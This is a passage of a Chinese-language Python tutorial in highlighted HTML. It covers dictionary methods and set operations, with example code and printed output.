class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1, 1: 'dddd'}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 输出2,test的值</span><span class="token comment"># test 1</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键名</span><span class="token comment"># dict_keys(['test', 1])</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出所有键值</span><span class="token comment"># dict_values([1, 'dddd'])</span><span class="token builtin">dict</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'txt'</span>  <span class="token comment"># 修改键值</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># {2: 'test', 'test': 'txt'}</span><span class="token keyword">del</span> dict2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>  <span class="token comment"># 删除一个键</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'test': 1}</span>dict2<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 清空字典</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {}</span><span class="token keyword">del</span> dict2  <span class="token comment"># 删除字典</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'str'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token comment"># 重复时后者覆盖前者</span><span class="token keyword">print</span><span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token comment"># {'1': 2, 'var': 'var', 'test': 'test'}</span><span class="token triple-quoted-string string">'''{2: 'test', 'test': 1}{'test': 1, 1: 'dddd'}test 1dict_keys(['test', 1])dict_values([1, 'dddd']){2: 'test', 'test': 'txt'}{'test': 1}{}{'1': 2, 'var': 'var', 'test': 'test'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数-3"><a href="#函数-3" class="headerlink" title="函数"></a>函数</h3><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th><th align="left">实例</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">len(dict) 计算字典元素个数，即键的总数。</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'} </code><br><code>&gt;&gt;&gt; len(dict) 3</code></td></tr><tr><td align="left">2</td><td align="left">str(dict) 输出字典，可以打印的字符串表示。</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; str(dict) </code><br><code>"{'Name': 'Runoob', 'Class': 'First', 'Age': 7}"</code></td></tr><tr><td align="left">3</td><td align="left">type(variable) 返回输入的变量类型，如果变量是字典就返回字典类型。</td><td align="left"><code>&gt;&gt;&gt; dict = {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}  </code><br><code>&gt;&gt;&gt; type(dict) </code><br><code>&lt;class 'dict'&gt;</code></td></tr></tbody></table><table><thead><tr><th align="left">序号</th><th align="left">函数及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-clear.html">radiansdict.clear()</a> 删除字典内所有元素</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-copy.html">radiansdict.copy()</a> 返回一个字典的浅复制</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-fromkeys.html">radiansdict.fromkeys()</a> 创建一个新字典，以序列seq中元素做字典的键，val为字典所有键对应的初始值</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-get.html">radiansdict.get(key, default=None)</a> 返回指定键的值，如果键不在字典中返回 default 设置的默认值</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-in.html">key in dict</a> 如果键在字典dict里返回true，否则返回false</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-items.html">radiansdict.items()</a> 以列表返回一个视图对象</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-keys.html">radiansdict.keys()</a> 返回一个视图对象</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-setdefault.html">radiansdict.setdefault(key, default=None)</a> 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-update.html">radiansdict.update(dict2)</a> 把字典dict2的键/值对更新到dict里</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-values.html">radiansdict.values()</a> 返回一个视图对象</td></tr><tr><td align="left">11</td><td align="left">[pop(key<a href="https://www.runoob.com/python3/python3-att-dictionary-pop.html">,default])</a> 删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-att-dictionary-popitem.html">popitem()</a> 随机返回并删除字典中的最后一对键和值。</td></tr></tbody></table><h3 id="函数示例-3"><a href="#函数示例-3" class="headerlink" title="函数示例"></a>函数示例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Zara'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"字典长度 : %d"</span> <span class="token operator">%</span>  <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 字典长度 : 2</span><span class="token builtin">dict</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"字典删除后长度 : %d"</span> <span class="token operator">%</span>  <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 字典删除后长度 : 0</span>dict1 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token string">'Class'</span><span class="token punctuation">:</span> <span class="token string">'First'</span><span class="token punctuation">}</span>dict2 <span class="token operator">=</span> dict1<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"新复制的字典为 : "</span><span class="token punctuation">,</span> dict2<span class="token punctuation">)</span><span class="token comment"># 新复制的字典为 :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}</span>seq <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">,</span> <span class="token string">'sex'</span><span class="token punctuation">)</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>seq<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"新的字典为 : %s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 新的字典为 : {'name': None, 'age': None, 'sex': None}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>fromkeys<span class="token punctuation">(</span>seq<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"新的字典为 : %s"</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 新的字典为 : {'name': 10, 'age': 10, 'sex': 10}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">27</span><span class="token punctuation">}</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Age 值为 : %s"</span> <span class="token operator">%</span>  <span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Age'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Age 值为 : 27</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Sex 值为 : %s"</span> <span class="token operator">%</span>  <span class="token builtin">dict</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Sex'</span><span class="token punctuation">,</span> <span class="token string">"NA"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Sex 值为 : NA</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token comment"># 检测键 Age 是否存在</span><span class="token keyword">if</span> <span class="token string">'Age'</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Age 存在"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Age 不存在"</span><span class="token punctuation">)</span><span class="token comment"># 键 Age 存在</span><span class="token comment"># 检测键 Sex 是否存在</span><span class="token keyword">if</span> <span class="token string">'Sex'</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Sex 存在"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Sex 不存在"</span><span class="token punctuation">)</span><span class="token comment"># 键 Sex 不存在</span><span class="token comment"># not in</span><span class="token comment"># 检测键 Age 是否存在</span><span class="token keyword">if</span> <span class="token string">'Age'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Age 不存在"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"键 Age 存在"</span><span class="token punctuation">)</span><span class="token comment"># 键 Age 存在</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Value : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Value : dict_items([('Name', 'Runoob'), ('Age', 7)])</span>dishes <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'eggs'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'sausage'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'bacon'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'spam'</span><span class="token punctuation">:</span> <span class="token number">500</span><span class="token punctuation">}</span>keys <span class="token operator">=</span> dishes<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>values <span class="token operator">=</span> dishes<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 迭代</span>n <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> val <span class="token keyword">in</span> values<span class="token punctuation">:</span>    n <span class="token operator">+=</span> val<span class="token keyword">print</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token comment"># 504</span><span class="token comment"># keys 和 values 以相同顺序（插入顺序）进行迭代</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token comment"># 使用 list() 转换为列表</span><span class="token comment"># ['eggs', 'sausage', 'bacon', 'spam']</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># [2, 1, 1, 500]</span><span class="token comment"># 视图对象是动态的，受字典变化的影响，以下删除了字典的 key，视图对象转为列表后也跟着变化</span><span class="token keyword">del</span> dishes<span class="token punctuation">[</span><span class="token string">'eggs'</span><span class="token punctuation">]</span><span class="token keyword">del</span> dishes<span class="token punctuation">[</span><span class="token string">'sausage'</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># ['bacon', 'spam']</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Age 键的值为 : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'Age'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Age 键的值为 : 7</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Sex 键的值为 : %s"</span> <span class="token operator">%</span> <span class="token builtin">dict</span><span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token string">'Sex'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Sex 键的值为 : None</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"新字典为："</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># 新字典为： {'Name': 'Runoob', 'Age': 7, 'Sex': None}</span><span class="token builtin">dict</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Name'</span><span class="token punctuation">:</span> <span class="token string">'Runoob'</span><span class="token punctuation">,</span> <span class="token string">'Age'</span><span class="token punctuation">:</span> <span class="token number">7</span><span class="token punctuation">}</span>dict2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Sex'</span><span class="token punctuation">:</span> <span class="token string">'female'</span><span class="token punctuation">}</span><span class="token builtin">dict</span><span class="token punctuation">.</span>update<span class="token punctuation">(</span>dict2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"更新字典 dict : "</span><span class="token punctuation">,</span> <span class="token builtin">dict</span><span class="token punctuation">)</span><span class="token comment"># 更新字典 dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}</span>site<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'菜鸟教程'</span><span class="token punctuation">,</span> <span class="token string">'alexa'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span>pop_obj<span class="token operator">=</span>site<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pop_obj<span class="token punctuation">)</span><span class="token comment"># 菜鸟教程</span>site<span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'菜鸟教程'</span><span class="token punctuation">,</span> <span class="token string">'alexa'</span><span class="token punctuation">:</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">:</span> <span class="token string">'www.runoob.com'</span><span class="token punctuation">}</span>pop_obj<span class="token operator">=</span>site<span class="token punctuation">.</span>popitem<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pop_obj<span class="token punctuation">)</span><span class="token comment"># ('url', 'www.runoob.com')</span><span class="token keyword">print</span><span class="token punctuation">(</span>site<span class="token punctuation">)</span><span class="token comment"># {'name': '菜鸟教程', 'alexa': 10000}</span><span class="token triple-quoted-string string">'''字典长度 : 2字典删除后长度 : 0新复制的字典为 :  {'Name': 'Runoob', 'Age': 7, 'Class': 'First'}新的字典为 : {'name': None, 'age': None, 'sex': None}新的字典为 : {'name': 10, 'age': 10, 'sex': 10}Age 值为 : 27Sex 值为 : NA键 Age 存在键 Sex 不存在键 Age 存在Value : dict_items([('Name', 'Runoob'), ('Age', 7)])504['eggs', 'sausage', 'bacon', 'spam'][2, 1, 1, 500]['bacon', 'spam']Age 键的值为 : 7Sex 键的值为 : None新字典为： {'Name': 'Runoob', 'Age': 7, 'Sex': None}更新字典 dict :  {'Name': 'Runoob', 'Age': 7, 'Sex': 'female'}菜鸟教程('url', 'www.runoob.com'){'name': '菜鸟教程', 'alexa': 10000}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>创建格式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">parame <span class="token operator">=</span> <span class="token punctuation">{</span>value1<span class="token punctuation">,</span> value2<span class="token punctuation">,</span> ……<span class="token punctuation">}</span><span class="token keyword">or</span><span class="token builtin">set</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 创建一个空集合</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">sites <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'123'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>sites<span class="token punctuation">)</span>  <span class="token comment"># 输出集合，重复的元素被自动去掉</span><span class="token comment"># {1, '123', 'test'}</span><span class="token comment"># 成员测试</span><span class="token keyword">if</span> <span class="token string">'test'</span> <span class="token keyword">in</span> sites<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test 在集合中'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test 不在集合中'</span><span class="token punctuation">)</span><span class="token comment"># set可以进行集合运算</span>a <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'abracadabra'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token string">'alacazam'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">-</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的差集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">|</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的并集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">&amp;</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 的交集</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">^</span> b<span class="token punctuation">)</span>  <span class="token comment"># a 和 b 中不同时存在的元素</span><span class="token triple-quoted-string string">'''{1, '123', 'test'}test 在集合中{'a', 'b', 'r', 'c', 'd'}{'b', 'd', 'r'}{'a', 'm', 'r', 'b', 'c', 'd', 'l', 'z'}{'c', 'a'}{'d', 'l', 'r', 'm', 'z', 'b'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>推导式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">{</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token string">'abracadabra'</span> <span class="token keyword">if</span> x <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token string">'abc'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token comment"># {'r', 'd'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><h4 id="添加元素"><a href="#添加元素" class="headerlink" title="添加元素"></a>添加元素</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>add<span class="token punctuation">(</span> x <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>add<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Taobao', 'Google', 'Runoob'}{'Taobao', 'test', 'Google', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>s.update( x )参数可以是列表，元组，字典</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>update<span class="token punctuation">(</span> x <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{1, 3, 'Google', 'Taobao', 'Runoob'}{1, 3, 4, 'Google', 5, 6, 'Taobao', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="移除元素"><a href="#移除元素" class="headerlink" title="移除元素"></a>移除元素</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>remove<span class="token punctuation">(</span> x <span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Google', 'Taobao', 'Runoob'}{'Google', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>discard<span class="token punctuation">(</span> x <span class="token punctuation">)</span>thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span>thisset<span class="token punctuation">.</span>discard<span class="token punctuation">(</span><span class="token string">"Facebook"</span><span class="token punctuation">)</span>  <span class="token comment"># 不存在不会发生错误</span><span class="token keyword">print</span><span class="token punctuation">(</span>thisset<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''{'Google', 'Taobao', 'Runoob'}{'Google', 'Taobao', 'Runoob'}'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置随机删除集合中的一个元素</p><p>pop 方法会对集合进行无序的排列</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span> thisset <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"Google"</span><span class="token punctuation">,</span> <span class="token string">"Runoob"</span><span class="token punctuation">,</span> <span class="token string">"Taobao"</span><span class="token punctuation">,</span> <span class="token string">"Facebook"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> thisset<span class="token 